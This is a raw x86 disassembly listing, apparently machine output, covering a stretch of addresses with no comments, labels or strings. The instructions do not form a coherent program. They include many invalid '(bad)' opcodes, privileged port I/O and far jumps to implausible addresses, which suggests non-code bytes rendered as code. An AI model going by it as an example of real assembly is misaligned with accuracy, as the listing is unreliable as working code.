  411087:	push   esi
  411088:	dec    ecx
  411089:	mov    ?,WORD PTR [eax]
  41108b:	cmp    ah,al
  41108d:	pop    ds
  41108e:	js     0x4110b3
  411090:	test   BYTE PTR [edx+ecx*4+0x43],bh
  411094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411095:	or     ebx,ecx
  411097:	push   esp
  411098:	cs dec esp
  41109a:	xchg   esp,eax
  41109b:	mov    ds:0x5f635094,eax
  4110a0:	shl    ah,cl
  4110a2:	arpl   WORD PTR [edi-0xa4a13ba],di
  4110a8:	inc    esi
  4110a9:	clc    
  4110aa:	shl    ah,0xe3
  4110ad:	arpl   WORD PTR [edx],bx
  4110af:	outs   dx,DWORD PTR ds:[esi]
  4110b0:	push   eax
  4110b1:	adc    DWORD PTR [ebx],ebp
  4110b3:	sbb    BYTE PTR ds:0x1e9e364d,0x71
  4110ba:	mov    BYTE PTR [edi+esi*2],0x73
  4110be:	adc    bl,BYTE PTR [ecx-0x57]
  4110c1:	aaa    
  4110c2:	jae    0x411065
  4110c4:	idiv   DWORD PTR [edi+edx*2+0x316375e2]
  4110cb:	adc    ebx,ecx
  4110cd:	pop    esi
  4110ce:	retf   0x83c0
  4110d1:	jg     0x4110ce
  4110d3:	mov    ch,0xf5
  4110d5:	hlt    
  4110d6:	(bad)  
  4110d7:	pop    edi
  4110d8:	mov    gs,WORD PTR [eax+0x6f316e54]
  4110de:	xchg   DWORD PTR [edx+0x38],ebp
  4110e1:	xchg   ecx,eax
  4110e2:	lds    esp,FWORD PTR [edi]
  4110e4:	push   cs
  4110e5:	push   eax
  4110e6:	add    ch,BYTE PTR [ebp-0x5c]
  4110e9:	xor    ah,BYTE PTR [ecx+0x51b119fe]
  4110ef:	mov    eax,0xbdce3f92
  4110f4:	loop   0x41109f
  4110f6:	sub    DWORD PTR [edi+0x51],edx
  4110f9:	mov    bl,0x3f
  4110fb:	xchg   DWORD PTR [esi],esi
  4110fd:	fsub   QWORD PTR [ecx+0x71462b9e]
  411103:	lods   eax,DWORD PTR ds:[esi]
  411104:	cmp    eax,0x3f2db23f
  411109:	push   ecx
  41110a:	das    
  41110b:	aas    
  41110c:	test   al,0x14
  41110e:	lods   eax,DWORD PTR ds:[esi]
  41110f:	or     DWORD PTR [ecx],0x29c4a1b3
  411115:	hlt    
  411116:	ror    dl,1
  411118:	push   cs
  411119:	mov    edx,0x550c94f8
  41111e:	jge    0x4110a5
  411120:	scas   al,BYTE PTR es:[edi]
  411121:	fwait
  411122:	mov    ah,0x91
  411124:	pop    ecx
  411125:	adc    ah,BYTE PTR [esp+esi*8-0xf]
  411129:	or     DWORD PTR [ecx-0x50],esp
  41112c:	jae    0x4110d6
  41112e:	xor    eax,0xa6ce9e1c
  411133:	xchg   esi,eax
  411134:	aam    0xf5
  411136:	mov    ds:0x97f05ada,al
  41113b:	adc    DWORD PTR [esp+ebx*4],eax
  41113e:	cwde   
  41113f:	std    
  411140:	ret    
  411141:	dec    esi
  411142:	mov    edx,ecx
  411144:	out    0xf6,al
  411146:	fdiv   DWORD PTR [edx-0x2c]
  411149:	dec    esi
  41114a:	mov    al,ds:0x7184d6ac
  41114f:	cli    
  411150:	ret    0x7a74
  411153:	stos   DWORD PTR es:[edi],eax
  411154:	pop    ecx
  411155:	xor    DWORD PTR [eax+0x550c308e],esp
  41115b:	stos   DWORD PTR es:[edi],eax
  41115c:	or     DWORD PTR [ecx],edx
  41115e:	fsub   QWORD PTR [ebx+0x4abd59e7]
  411164:	cmp    al,0xac
  411166:	loop   0x411158
  411168:	adc    eax,0xe43b563d
  41116d:	and    al,0x33
  41116f:	repz les eax,FWORD PTR [esi+0x39]
  411173:	ret    
  411174:	bound  eax,QWORD PTR [esi+0x41]
  411177:	outs   dx,DWORD PTR ds:[esi]
  411178:	xchg   BYTE PTR [esi+0x3f],dl
  41117b:	int    0x3a
  41117d:	add    ch,ah
  41117f:	nop
  411180:	stos   BYTE PTR es:[edi],al
  411181:	dec    edx
  411182:	aam    0xb2
  411184:	jae    0x4111ec
  411186:	call   FWORD PTR [esi+0x523ca0d6]
  41118c:	int3   
  41118d:	and    ch,BYTE PTR [ecx+ecx*1-0x29a1591f]
  411194:	mov    ah,BYTE PTR [edi+0x27]
  411197:	add    BYTE PTR [ebx],dh
  411199:	xchg   al,ah
  41119b:	ret    0x2d23
  41119e:	dec    ebp
  41119f:	stc    
  4111a0:	sub    al,0xe0
  4111a2:	mov    eax,0xb655d2fd
  4111a7:	or     al,0xb0
  4111a9:	iret   
  4111aa:	jmp    0x411186
  4111ac:	(bad)  
  4111ae:	xchg   ebx,eax
  4111af:	sbb    BYTE PTR [ebx+0x67],bh
  4111b2:	and    al,0xc7
  4111b4:	je     0x411154
  4111b6:	pop    ebx
  4111b7:	js     0x4111d6
  4111b9:	inc    esi
  4111ba:	cmp    eax,0xbb0f5080
  4111bf:	call   eax
  4111c1:	scas   eax,DWORD PTR es:[edi]
  4111c2:	cmp    eax,0x6d039e7e
  4111c7:	lods   eax,DWORD PTR ds:[esi]
  4111c8:	mov    bl,0x26
  4111ca:	imul   edx,DWORD PTR [ebx],0x9b793a75
  4111d0:	bound  esp,QWORD PTR [edx+eiz*4+0x3f]
  4111d4:	dec    edx
  4111d5:	stos   BYTE PTR es:[edi],al
  4111d6:	aaa    
  4111d7:	xor    bh,BYTE PTR [edi-0x2e468ff0]
  4111dd:	stc    
  4111de:	pop    es
  4111df:	popf   
  4111e0:	xchg   DWORD PTR ds:0x2157133f,esp
  4111e6:	popa   
  4111e7:	mov    DWORD PTR [ecx-0x63],eax
  4111ea:	mov    dh,0x31
  4111ec:	(bad)  
  4111ee:	(bad)  
  4111ef:	das    
  4111f0:	test   eax,0x22288e65
  4111f5:	pop    ecx
  4111f6:	pop    ss
  4111f7:	dec    esp
  4111f8:	sbb    dh,BYTE PTR [esp+edx*1]
  4111fb:	add    dl,BYTE PTR [esi]
  4111fd:	aaa    
  4111fe:	test   BYTE PTR [edx-0x3370b199],al
  411204:	call   0xe0f39065
  411209:	pop    ss
  41120a:	loope  0x411254
  41120c:	enter  0x4e3c,0x25
  411210:	rol    edx,0xa
  411213:	adc    eax,DWORD PTR [esi]
  411215:	pop    es
  411216:	mov    edi,0xfe26d160
  41121b:	(bad)  
  41121c:	icebp  
  41121d:	out    dx,eax
  41121e:	push   0xffffff8b
  411220:	shl    BYTE PTR [esi],0x0
  411223:	inc    esi
  411224:	outs   dx,BYTE PTR ds:[esi]
  411225:	aad    0xaa
  411227:	int    0x14
  411229:	fsub   DWORD PTR [eax]
  41122b:	ffree  st(2)
  41122d:	je     0x41121f
  41122f:	cdq    
  411230:	ins    DWORD PTR es:[edi],dx
  411231:	xchg   ebx,eax
  411232:	shr    BYTE PTR [esi*2+0x5579620f],cl
  411239:	or     eax,0x1a9595a1
  41123e:	cmp    eax,0x395be042
  411243:	outs   dx,DWORD PTR ds:[esi]
  411244:	mov    edi,0x41395375
  411249:	push   ds
  41124a:	mov    cs,ebx
  41124c:	test   BYTE PTR [ebx],cl
  41124e:	scas   al,BYTE PTR es:[edi]
  41124f:	into   
  411250:	mov    ah,0x1c
  411252:	fmulp  st(6),st
  411254:	aam    0xc8
  411256:	push   ds
  411257:	dec    ebx
  411258:	cmp    BYTE PTR [esi+0x27d5b319],dh
  41125e:	pop    esp
  41125f:	rol    DWORD PTR [edx],1
  411261:	push   edx
  411262:	push   0xf6a89dba
  411267:	adc    DWORD PTR [esi-0x2fcd02b5],0x35
  41126e:	dec    ebp
  41126f:	jne    0x41127c
  411271:	push   ebp
  411272:	mov    bh,0x1d
  411274:	xor    ch,BYTE PTR [edx+0x1a]
  411277:	ins    BYTE PTR es:[edi],dx
  411278:	push   ds
  411279:	pop    ss
  41127a:	call   0xfb3f:0x58023339
  411281:	call   0x1602:0xa6f0c6d1
  411288:	adc    eax,0x7ddaa7a
  41128d:	shl    DWORD PTR [edx-0x7f26dedf],cl
  411293:	mov    ebp,0x4f941f34
  411298:	cmp    al,0xfc
  41129a:	mov    al,ds:0x97e472d4
  41129f:	js     0x411262
  4112a1:	mov    dh,0x82
  4112a3:	call   0xd930:0x8ee51a41
  4112aa:	call   DWORD PTR [eax]
  4112ac:	or     BYTE PTR ds:0x51ea84f8,ah
  4112b2:	inc    esi
  4112b3:	xchg   esi,eax
  4112b4:	ins    DWORD PTR es:[edi],dx
  4112b5:	mov    edi,0xcafc0009
  4112ba:	mov    ds:0xe5fbc9b4,al
  4112bf:	lock (bad) 
  4112c1:	and    ch,cl
  4112c3:	pusha  
  4112c4:	sbb    edi,DWORD PTR [esp]
  4112c7:	inc    ebp
  4112c8:	inc    esp
  4112c9:	and    DWORD PTR [edi],0x45
  4112cc:	push   0x377ca2ce
  4112d1:	dec    esi
  4112d2:	enter  0x6d55,0xd0
  4112d6:	pop    edi
  4112d7:	mov    ds:0xf98274a4,eax
  4112dc:	test   DWORD PTR [edx+0x1d],0x2beefa70
  4112e3:	mov    ebp,0x4da3d38c
  4112e8:	leave  
  4112e9:	stos   BYTE PTR es:[edi],al
  4112ea:	cld    
  4112eb:	(bad)  
  4112ec:	jno    0x4112ea
  4112ee:	xchg   edi,eax
  4112ef:	inc    edi
  4112f0:	dec    esp
  4112f1:	xchg   esi,eax
  4112f2:	mov    edi,0x4eb18c35
  4112f7:	cmp    al,0x39
  4112f9:	mov    bh,0xaf
  4112fb:	jle    0x41129d
  4112fd:	enter  0x83b0,0xf5
  411301:	fs pusha 
  411303:	ss in  eax,0xb1
  411306:	jp     0x411376
  411308:	mov    esi,DWORD PTR [ebx+0x23]
  41130b:	sub    BYTE PTR [eax+0x2987a843],cl
  411311:	dec    edi
  411312:	nop
  411313:	das    
  411314:	sbb    eax,0xf41aad44
  411319:	inc    esp
  41131a:	xchg   BYTE PTR [ecx-0x76],al
  41131d:	cwde   
  41131e:	inc    ecx
  41131f:	sub    DWORD PTR [edi+0x1a],edi
  411322:	in     al,0x88
  411324:	inc    edx
  411325:	push   esi
  411326:	xchg   ebp,eax
  411327:	dec    ebp
  411328:	cmp    al,0xb
  41132a:	mov    bh,0x3b
  41132c:	add    al,0x15
  41132e:	fmulp  st(1),st
  411330:	dec    ebx
  411331:	push   cs
  411332:	jne    0x411360
  411334:	dec    ebx
  411335:	adc    eax,0x66c58f58
  41133a:	jecxz  0x411311
  41133c:	test   eax,0x934903b6
  411341:	(bad)  
  411342:	scas   al,BYTE PTR es:[edi]
  411343:	add    DWORD PTR [edi-0x21867af9],eax
  411349:	retf   
  41134a:	dec    edi
  41134b:	ins    BYTE PTR es:[edi],dx
  41134c:	adc    DWORD PTR [ebx-0x494ba26b],0x2
  411353:	scas   al,BYTE PTR es:[edi]
  411354:	(bad)  
  411355:	jns    0x411303
  411357:	(bad)  
  411359:	in     al,dx
  41135a:	in     al,0xfb
  41135c:	push   esi
  41135d:	aaa    
  41135e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41135f:	ins    BYTE PTR es:[edi],dx
  411360:	in     al,0x7c
  411362:	(bad)  [esi+ecx*8-0x13]
  411366:	test   al,0xeb
  411368:	jmp    0x4a871a54
  41136d:	aaa    
  41136e:	inc    edx
  41136f:	pop    edi
  411370:	aaa    
  411371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411372:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411373:	mov    al,ds:0xd852d16d
  411378:	fidiv  DWORD PTR [ebp-0x273d06ac]
  41137e:	add    al,0xbb
  411380:	sub    al,0xc0
  411382:	mov    ds:0x8c713018,eax
  411387:	jmp    0x74f4:0x75571384
  41138e:	out    dx,al
  41138f:	pop    es
  411390:	and    edi,DWORD PTR [ebx]
  411392:	or     al,0x81
  411394:	push   ecx
  411395:	or     esi,DWORD PTR [esi]
  411397:	and    dh,BYTE PTR [esi-0x5e5f9eaa]
  41139d:	aas    
  41139e:	add    al,0x92
  4113a0:	dec    esp
  4113a1:	lods   al,BYTE PTR ds:[esi]
  4113a2:	push   0xffffffa8
  4113a4:	mov    ebx,0x52379675
  4113a9:	push   edi
  4113aa:	adc    eax,0xa9c9bf2f
  4113af:	and    DWORD PTR [eax],edx
  4113b1:	or     ebx,0x2f
  4113b4:	fnsave [ecx]
  4113b6:	pop    ebx
  4113b7:	sub    al,0x29
  4113b9:	adc    eax,0xec54ee7e
  4113be:	ret    
  4113bf:	(bad)  
  4113c0:	jmp    0x4113a9
  4113c2:	shr    DWORD PTR [esi-0x7e],0x13
  4113c6:	ficom  WORD PTR [ecx+0x39]
  4113c9:	or     edi,ebp
  4113cb:	std    
  4113cc:	rcl    DWORD PTR [edi-0x54],1
  4113cf:	cmp    al,0xbd
  4113d1:	sbb    BYTE PTR [esi],bh
  4113d3:	in     al,dx
  4113d4:	not    DWORD PTR [edi]
  4113d6:	jmp    0x8f29:0xbe55ce68
  4113dd:	cmp    eax,DWORD PTR [esi-0x1f75e37c]
  4113e3:	sbb    DWORD PTR [ebx-0x5d262c34],ecx
  4113e9:	add    DWORD PTR [esi],edi
  4113eb:	das    
  4113ec:	xor    edi,DWORD PTR [esi+0x62]
  4113ef:	jne    0x411425
  4113f1:	cmp    BYTE PTR [ebx+0x3089aa07],al
  4113f7:	addr16 mov ds:0xfbbc,al
  4113fb:	add    DWORD PTR [edx+edi*4-0x44fd5d5a],0x29c3c47
  411406:	mov    esi,0x12032934
  41140b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41140c:	jmp    0x99773e85
  411411:	je     0x41139b
  411413:	xor    eax,DWORD PTR [ecx+0x73feb5e3]
  411419:	retf   
  41141a:	pushf  
  41141b:	sti    
  41141c:	sub    edi,DWORD PTR [bp+si-0x4c9a]
  411421:	stos   DWORD PTR es:[edi],eax
  411422:	and    eax,0xa06fb6a9
  411427:	retf   0x8e3f
  41142a:	xor    esi,DWORD PTR [ecx+edx*1-0x3e]
  41142e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41142f:	sbb    al,0xec
  411431:	inc    ebp
  411432:	cmp    eax,0xb8620b5a
  411437:	(bad)  
  411438:	test   ecx,eax
  41143a:	jle    0x41140b
  41143c:	mov    ds,WORD PTR [eax+0x23ae5e3f]
  411442:	push   ss
  411443:	pop    ss
  411444:	mov    eax,ds:0x4111192c
  411449:	fadd   st(5),st
  41144b:	inc    edx
  41144c:	mov    eax,ds:0x40430462
  411451:	mov    ecx,DWORD PTR [eax]
  411453:	or     BYTE PTR [eax-0x56],dl
  411456:	iret   
  411457:	into   
  411458:	add    BYTE PTR [eax],0xd0
  41145b:	nop
  41145c:	mov    esi,0x45632d90
  411461:	inc    BYTE PTR [eax+0x30]
  411464:	xchg   esp,eax
  411465:	lea    edx,[ebx-0x15aa7e17]
  41146b:	pop    es
  41146c:	loop   0x41143f
  41146e:	rcr    bl,0x50
  411471:	jmp    0x36aa0a2b
  411476:	sar    DWORD PTR [ecx+0x3f],0xd
  41147a:	fsub   QWORD PTR [esi]
  41147c:	out    dx,al
  41147d:	lock scas eax,DWORD PTR es:[edi]
  41147f:	aad    0x72
  411481:	std    
  411482:	popa   
  411483:	ss push ss
  411485:	es jmp 0x7da9:0x7192d471
  41148d:	push   edi
  41148e:	adc    DWORD PTR [eax+0x4b73590d],esp
  411494:	retf   0x1102
  411497:	les    ebp,FWORD PTR [edx]
  411499:	xchg   edi,eax
  41149a:	daa    
  41149b:	adc    al,0x68
  41149d:	add    edx,DWORD PTR [ebx-0x2deb047d]
  4114a3:	cmp    ch,BYTE PTR [ecx-0x24]
  4114a6:	mov    DWORD PTR [esi-0x39],0xb6d501ff
  4114ad:	and    eax,0xac8db2d3
  4114b2:	cld    
  4114b3:	jno    0x41150b
  4114b5:	inc    eax
  4114b6:	adc    esp,DWORD PTR [ebx+0x4b]
  4114b9:	sbb    BYTE PTR [ebx],dl
  4114bb:	xchg   ebx,eax
  4114bc:	xlat   BYTE PTR ds:[ebx]
  4114bd:	push   eax
  4114be:	add    BYTE PTR [ebx-0x6ff75411],ch
  4114c4:	jne    0x411448
  4114c6:	push   eax
  4114c7:	dec    ecx
  4114c8:	or     eax,0x280fb8fe
  4114cd:	jmp    0x41151d
  4114cf:	jmp    0xfa94:0xcc137436
  4114d6:	and    ch,dh
  4114d8:	xor    eax,ecx
  4114da:	xor    cl,0x44
  4114dd:	mov    ecx,0x23707980
  4114e2:	adc    BYTE PTR [edx+0x72],dh
  4114e5:	or     dl,BYTE PTR [esi+0x12d552f6]
  4114eb:	ins    DWORD PTR es:[edi],dx
  4114ec:	sahf   
  4114ed:	push   0x78
  4114ef:	push   eax
  4114f0:	shl    BYTE PTR ds:0xb40d0cfd,1
  4114f6:	xchg   ebx,eax
  4114f7:	retf   
  4114f8:	lods   al,BYTE PTR ds:[esi]
  4114f9:	add    dl,BYTE PTR [edi-0x40]
  4114fc:	xor    BYTE PTR [esi],dl
  4114fe:	jmp    0x386e:0x613b90da
  411505:	icebp  
  411506:	popf   
  411507:	daa    
  411508:	xor    BYTE PTR [ebx-0x73],ch
  41150b:	outs   dx,BYTE PTR ds:[esi]
  41150c:	addr16 jle 0x411585
  41150f:	fnstcw WORD PTR [edx-0x5e0585a0]
  411515:	mov    BYTE PTR [edi],bl
  411517:	mov    esi,0xc4580f0d
  41151c:	xchg   esp,eax
  41151d:	jnp    0x41151a
  41151f:	das    
  411520:	test   eax,0xa921d519
  411525:	repnz leave 
  411527:	sahf   
  411528:	mov    ds:0xfbdb0c7f,al
  41152d:	imul   ebp,DWORD PTR [edx-0x2b0e4a7d],0xeaef66ba
  411537:	mov    ds:0xac4b14f8,eax
  41153c:	mov    edx,0xc4ca6a81
  411541:	cmp    BYTE PTR [edx+0x5b51ab47],bl
  411547:	xchg   esi,eax
  411548:	push   0xfffffff8
  41154a:	or     eax,0xe4f729d2
  41154f:	sbb    DWORD PTR [ebx+0x69382bfb],0xffffffe0
  411556:	fsub   QWORD PTR [ecx+0x73]
  411559:	gs retf 
  41155b:	int    0xd7
  41155d:	daa    
  41155e:	pop    edx
  41155f:	lods   eax,DWORD PTR ds:[esi]
  411560:	enter  0x3558,0xa0
  411564:	xchg   DWORD PTR [edi+0x4ce07e66],esi
  41156a:	aam    0x9e
  41156c:	mov    ah,0xa1
  41156e:	retf   
  41156f:	mov    eax,0x6540260c
  411574:	jo     0x4115d4
  411576:	stc    
  411577:	ins    DWORD PTR es:[edi],dx
  411578:	dec    edi
  411579:	or     eax,0x60a01647
  41157e:	ror    BYTE PTR [ecx],0x86
  411581:	aam    0x35
  411583:	push   ebp
  411584:	push   ss
  411585:	ja     0x4115b3
  411587:	mov    esi,0x5bcb1ab9
  41158c:	or     al,0x63
  41158e:	test   eax,0xc4ecda9
  411593:	push   0x7fefbe05
  411598:	into   
  411599:	repnz lea eax,[edx+0x14]
  41159d:	int    0xee
  41159f:	inc    eax
  4115a0:	xor    eax,0xcfdfa178
  4115a5:	dec    ebp
  4115a6:	pop    ds
  4115a7:	dec    esp
  4115a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115a9:	jg     0x41160f
  4115ab:	mov    ds:0x89efa27b,eax
  4115b0:	and    BYTE PTR [esi-0x38973247],cl
  4115b6:	adc    DWORD PTR [edi-0xd5307c2],0x66
  4115bd:	fisub  DWORD PTR [edi-0x6f]
  4115c0:	mov    bl,0x32
  4115c2:	xor    esi,DWORD PTR [edi]
  4115c4:	popa   
  4115c5:	pusha  
  4115c6:	mov    eax,ds:0x88344e0b
  4115cb:	(bad)  
  4115cc:	stos   BYTE PTR es:[edi],al
  4115cd:	es jae 0x4115eb
  4115d0:	das    
  4115d1:	and    al,0x9f
  4115d3:	into   
  4115d4:	inc    eax
  4115d5:	aas    
  4115d6:	inc    esi
  4115d7:	mov    esi,0xbd71071f
  4115dc:	jbe    0x4115d9
  4115de:	das    
  4115df:	adc    dl,BYTE PTR [eax+0x5f]
  4115e2:	xchg   ebx,eax
  4115e3:	gs dec edx
  4115e5:	imul   edx,DWORD PTR [edi],0x929b56cb
  4115eb:	jl     0x4115b7
  4115ed:	aam    0x98
  4115ef:	dec    ebp
  4115f0:	or     edx,DWORD PTR [ebp-0x33acfa17]
  4115f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f7:	clc    
  4115f8:	sbb    eax,edx
  4115fa:	xor    DWORD PTR [ecx],esp
  4115fc:	js     0x411601
  4115fe:	rol    BYTE PTR [esi],1
  411600:	inc    esp
  411601:	jnp    0x4115ba
  411603:	xchg   esi,eax
  411604:	mov    ebp,0x92ea4a43
  411609:	xchg   edx,eax
  41160a:	mov    bl,0x89
  41160d:	in     al,0x55
  41160f:	pop    ebp
  411610:	aad    0xa7
  411612:	(bad)  
  411613:	in     eax,dx
  411614:	dec    ebp
  411615:	repnz cmp ebp,0xffffffd1
  411619:	jo     0x411652
  41161b:	and    dh,BYTE PTR [ecx]
  41161d:	add    eax,DWORD PTR [eax+0x1cc6c01f]
  411623:	pop    ss
  411624:	fwait
  411625:	out    0x13,eax
  411627:	push   ds
  411628:	mov    bl,0x42
  41162a:	fsubrp st(2),st
  41162c:	xor    al,0x3d
  41162e:	retf   0x4496
  411631:	cwde   
  411632:	mov    ebp,0xf0a2b51
  411637:	hlt    
  411638:	addr16 inc edx
  41163a:	dec    esp
  41163b:	xlat   BYTE PTR ds:[ebx]
  41163c:	stos   BYTE PTR es:[edi],al
  41163d:	cwde   
  41163e:	ins    DWORD PTR es:[edi],dx
  41163f:	push   0x38
  411641:	dec    edi
  411642:	outs   dx,DWORD PTR ds:[esi]
  411643:	mov    dl,0xbe
  411645:	and    BYTE PTR [edx-0x6591f6a4],ch
  41164b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41164c:	(bad)  
  41164d:	adc    eax,0xf3ecccd7
  411652:	inc    ebp
  411653:	mov    al,0x57
  411655:	fadd   DWORD PTR [edx-0x64f4af0c]
  41165b:	outs   dx,BYTE PTR ds:[esi]
  41165c:	inc    ebx
  41165d:	sub    DWORD PTR [ebx+edx*8],ecx
  411660:	add    al,0x8e
  411662:	cmp    BYTE PTR [ebp+0x387c8c4d],dh
  411668:	call   0x1ce7:0xfc6c2cb
  41166f:	out    0x75,al
  411671:	push   eax
  411672:	add    dl,dl
  411674:	pop    ebx
  411675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411676:	xor    DWORD PTR [eax+0xdb6ce07],esp
  41167c:	les    ebp,FWORD PTR [ecx+0x2f]
  41167f:	fwait
  411680:	adc    DWORD PTR [ebx-0x4c5523e4],0x30796a4f
  41168a:	sub    esp,DWORD PTR [edx+0x1]
  41168d:	add    eax,0x329f238c
  411692:	inc    edi
  411693:	pop    ds
  411694:	lods   al,BYTE PTR ds:[esi]
  411695:	inc    edx
  411696:	call   0xf85e:0xa2373a3e
  41169d:	push   eax
  41169e:	rcr    dh,cl
  4116a0:	repnz ficomp WORD PTR [ebx+0x445e9942]
  4116a7:	ins    DWORD PTR es:[edi],dx
  4116a8:	adc    BYTE PTR [ecx],ch
  4116aa:	retf   
  4116ab:	call   0x58e22d70
  4116b0:	cmp    eax,0xc1116e26
  4116b5:	jmp    0xb817a003
  4116ba:	mov    dl,0x90
  4116bc:	xchg   esp,eax
  4116bd:	popa   
  4116be:	adc    eax,DWORD PTR [edx]
  4116c0:	scas   eax,DWORD PTR es:[edi]
  4116c1:	aas    
  4116c2:	adc    al,0xb5
  4116c4:	iret   
  4116c5:	(bad)
  4116c8:	les    ecx,FWORD PTR [esi-0x6b]
  4116cb:	push   ebx
  4116cc:	mul    BYTE PTR [eax]
  4116ce:	pop    ecx
  4116cf:	cmp    ebx,DWORD PTR [ebx-0x41b07ae1]
  4116d5:	mov    ecx,0xe1439d29
  4116da:	xor    dh,BYTE PTR [ebx+ecx*2-0x45]
  4116de:	sub    bh,BYTE PTR [esi+edx*1-0x11ff464]
  4116e5:	inc    ebx
  4116e6:	xor    dh,dh
  4116e8:	stos   DWORD PTR es:[edi],eax
  4116e9:	sub    eax,0x92b7c85a
  4116ee:	and    BYTE PTR [ebx+0x6345fa7b],0xa5
  4116f5:	pop    ebp
  4116f6:	adc    al,0xe
  4116f8:	gs jae 0x4116a8
  4116fb:	push   edx
  4116fc:	daa    
  4116fd:	not    DWORD PTR [ebp-0x206f33e]
  411703:	push   ds
  411704:	test   BYTE PTR [eax+0x4a7ccbeb],bh
  41170a:	jmp    DWORD PTR [edx]
  41170c:	push   es
  41170d:	jge    0x41172f
  41170f:	in     eax,0x47
  411711:	mov    edx,0x8a4c11dd
  411716:	cs into 
  411718:	xchg   bh,bh
  41171a:	idiv   DWORD PTR [ecx+0x799e95b1]
  411720:	xor    al,0xcc
  411722:	aaa    
  411723:	jmp    0x41179d
  411725:	setns  BYTE PTR [eax]
  411728:	sbb    dh,ah
  41172a:	pop    es
  41172b:	nop
  41172c:	mov    bh,0xa1
  41172e:	cmp    ecx,DWORD PTR [ecx+esi*4]
  411731:	or     eax,eax
  411733:	adc    DWORD PTR [edi+0x23ae05a0],esp
  411739:	inc    esp
  41173a:	sbb    BYTE PTR [edi+ebx*2+0x77],ch
  41173e:	push   ds
  41173f:	retf   
  411740:	xor    ebp,DWORD PTR [eax+0x3b1cb785]
  411746:	stos   BYTE PTR es:[edi],al
  411747:	add    BYTE PTR [ebx-0x6632760c],0xb2
  41174e:	(bad)  
  41174f:	sbb    DWORD PTR [ecx+0x4e],0xa4d96eea
  411756:	pop    es
  411757:	add    al,0xea
  411759:	mov    ds:0x29148b1c,eax
  41175e:	sub    eax,0x83980fa9
  411763:	rcr    BYTE PTR [edx-0x73],cl
  411766:	add    BYTE PTR [bx-0xb50],bl
  41176b:	xor    BYTE PTR [eax],dh
  41176d:	jno    0x411727
  41176f:	jmp    DWORD PTR [ebx]
  411771:	fstp   QWORD PTR [ebx+0x2059c159]
  411777:	jle    0x4117b9
  411779:	mov    eax,DWORD PTR [esi-0x469d06d]
  41177f:	lods   al,BYTE PTR ds:[esi]
  411780:	(bad)  
  411781:	xchg   esi,eax
  411782:	xor    ebp,DWORD PTR [ecx+0x0]
  411785:	pop    edx
  411786:	add    al,cl
  411788:	fisttp WORD PTR ds:0x7b29bfcf
  41178e:	aas    
  41178f:	jmp    0x3344:0x224bb416
  411796:	add    ecx,DWORD PTR [eax+ebp*8+0x7ba6388a]
  41179d:	popa   
  41179e:	sub    edi,DWORD PTR [ecx+0x4116495a]
  4117a4:	sbb    BYTE PTR [ebx-0x41],0x1a
  4117a8:	lds    edi,FWORD PTR [ebx-0x798368b9]
  4117ae:	jp     0x411785
  4117b0:	mov    ecx,0x8c8e96ef
  4117b5:	aad    0xd6
  4117b7:	add    al,0xa9
  4117b9:	add    BYTE PTR [ebp-0x728f2237],al
  4117bf:	sbb    eax,0x163d9bed
  4117c4:	xor    DWORD PTR [ebx],edi
  4117c6:	sbb    BYTE PTR [edx-0x3f1f8c8e],dh
  4117cc:	ret    0xdf33
  4117cf:	int3   
  4117d0:	(bad)  
  4117d1:	enter  0xf4d5,0x8
  4117d5:	push   ecx
  4117d6:	ins    DWORD PTR es:[edi],dx
  4117d7:	lahf   
  4117d8:	sbb    al,0x2c
  4117da:	mov    ds:0xc0eb644,al
  4117df:	xor    DWORD PTR [ebx+0x216d32e7],edi
  4117e5:	bound  esp,QWORD PTR [esi+0xfdbea8d]
  4117eb:	dec    ecx
  4117ec:	enter  0x4ab2,0x30
  4117f0:	sbb    ebp,DWORD PTR [eax+0x21]
  4117f3:	fs jae 0x411864
  4117f6:	ja     0x41182b
  4117f8:	xor    al,0xe0
  4117fa:	jnp    0x41183e
  4117fc:	sbb    eax,0xfbef5fe8
  411801:	cmp    al,0x6f
  411803:	gs inc bl
  411806:	rol    DWORD PTR [ebp+ebx*8-0x3d06f66],0x1
  41180e:	(bad)  
  411810:	xchg   ecx,eax
  411811:	sbb    eax,0x8f84d541
  411816:	sbb    dl,ah
  411818:	std    
  411819:	jae    0x411876
  41181b:	sbb    al,0x7f
  41181d:	adc    ebp,ebp
  41181f:	aam    0x64
  411821:	ret    
  411822:	jecxz  0x411838
  411824:	or     cl,al
  411826:	jge    0x411851
  411828:	mov    al,0x1d
  41182a:	push   eax
  41182b:	(bad)  
  41182c:	dec    esi
  41182d:	jno    0x411808
  41182f:	mov    ch,BYTE PTR ds:0xc5b09528
  411835:	adc    eax,0x424389f0
  41183a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41183b:	enter  0x1dca,0xe6
  41183f:	adc    DWORD PTR [eax*8-0x128773c4],ebx
  411846:	xor    dh,BYTE PTR [ebx]
  411848:	fild   DWORD PTR [ebx]
  41184a:	icebp  
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x9f60ba54
  411868:	int3   
  411869:	test   al,0xf4
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x65]
  411873:	mov    eax,ds:0x698dbbb7
  411878:	fild   WORD PTR [ebx]
  41187a:	pop    ss
  41187b:	push   ebx
  41187c:	push   0x988fd5d9
  411881:	jb     0x4118bc
  411883:	or     bl,BYTE PTR [eax*2+0x72cc41cb]
  41188a:	and    bl,BYTE PTR ds:0x39ced18
  411890:	rcl    BYTE PTR [ebx-0x6ce606bb],0x1b
  411897:	(bad)  
  411898:	clc    
  411899:	sahf   
  41189a:	or     al,0xd6
  41189c:	pop    esp
  41189d:	into   
  41189e:	icebp  
  41189f:	daa    
  4118a0:	inc    eax
